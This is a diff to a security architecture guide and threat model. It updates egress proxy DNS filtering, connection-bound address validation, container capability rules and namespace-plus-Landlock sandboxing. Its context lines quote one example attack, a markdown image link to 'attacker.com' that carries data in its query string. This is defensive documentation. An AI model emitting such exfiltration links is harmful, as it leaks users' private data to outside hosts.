@@ -218,8 +218,8 @@ This document serves as both the **Security Architecture Guide** and the **Secur
   - Covert exfiltration via markdown image tags (`![leak](https://attacker.com/leak?data=...)`).
 * **Hardening Guideline & Mitigations**:
   - **Hermetic Extraction**: The `mcp-fetch` adapter strips active scripts, inline styles, and embedded DOM iframes, converting content into sanitized plain markdown.
-  - **Filtered Egress**: In sandbox mode, supported Node HTTP clients are forced through Envoy by `NODE_USE_ENV_PROXY=1`; the application network is internal and only the egress sidecar bridges outward. The declarative URL validator rejects private and reserved results before each request and redirect.
-  - **Residual DNS Risk**: validation and Envoy connection resolution are separate operations. Until the proxy pins and revalidates the actual destination IP, DNS rebinding remains a documented time-of-check/time-of-use risk.
+  - **Filtered Egress**: In sandbox mode, supported Node HTTP clients are forced through digest-pinned Envoy 1.39.1 by `NODE_USE_ENV_PROXY=1`; the application network is internal and only the egress sidecar bridges outward. Envoy's `resolved_address_filter` removes private, reserved, loopback, link-local, multicast, documentation, and IPv4-mapped DNS results from the same cache used to select the upstream socket.
+  - **Connection-Bound DNS Validation**: declarative requests in standard mode connect through a custom lookup that returns only the twice-validated address set. Sandbox public requests use Envoy's connection-time DNS filter. Redirects repeat the full validation and connection-binding process; untrusted HTTPS tunnels are denied, while CONNECT is limited to explicitly trusted domains.
   - **Host Loopback Protection**: Critical host services bind to `127.0.0.1`. Phoenix additionally requires authentication and is isolated from the DSH service network behind the telemetry gateway.
 
 ### 12. [SEC-13] Cryptographic Integrity & Fail-Closed BYOK Vault
@@ -271,7 +271,7 @@ docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
 | Control | Standard Mode (`docker-compose.yml`) | Sandbox Mode (`sandbox.yml`) | Development Mode (`docker-compose.dev.yml`) |
 | :--- | :--- | :--- | :--- |
 | **Root Filesystem** | Writable | **Read-Only (`read_only: true`)** | Writable |
-| **Linux Capabilities** | **All Dropped (`cap_drop: ALL`)** | **All Dropped (`cap_drop: ALL`)** | **All Dropped (`cap_drop: ALL`)** |
+| **Linux Capabilities** | **Application capabilities dropped; executor UID has no effective capabilities and retains `SYS_ADMIN` only in its bounding set to enter a nested user namespace** | **Same executor boundary** | **Same executor boundary** |
 | **Privilege Escalation** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** |
 | **Host Config Mount** | **Read-Only (`./config:/etc/dsh:ro`)** | **Read-Only (`./config:/opt/dsh-config:ro`)** | **Read-Only (`./config:/etc/dsh:ro`)** |
 | **Application Workspace Mount** | Read-only base plus writable cases/artifacts | **Read-Only (`./workspaces:ro`) plus disposable cases/artifacts tmpfs** | Inherits standard plus development mounts |
@@ -285,10 +285,13 @@ docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
 | **Compilers in Image** | **Purged (`make`, `g++` stripped)** | **Purged (`make`, `g++` stripped)** | Purged in runner stage |
 
 The executor serializes commands as a conservative availability control and wraps each command
-in a per-invocation user/PID namespace (`unshare --user --map-root-user --pid --mount-proc
---fork`) before applying Landlock. Live Linux validation remains a release gate because kernel
-user-namespace policy and Landlock behavior vary by host; the service refuses to start when
-either required primitive is unavailable.
+in a per-invocation user/PID namespace (`unshare --user --map-root-user --pid --fork
+--kill-child=SIGKILL`) before
+applying Landlock. The service UID has no effective capabilities; `SYS_ADMIN` is retained only in
+its bounding set so Docker's default seccomp gate admits creation of the nested user namespace.
+Landlock then denies `/proc` and all paths outside the explicit command grants. A startup probe
+executes the complete namespace-plus-Landlock sequence and refuses service startup if either
+primitive is unavailable.
 
 To destroy all transient sandbox session data:
 ```bash
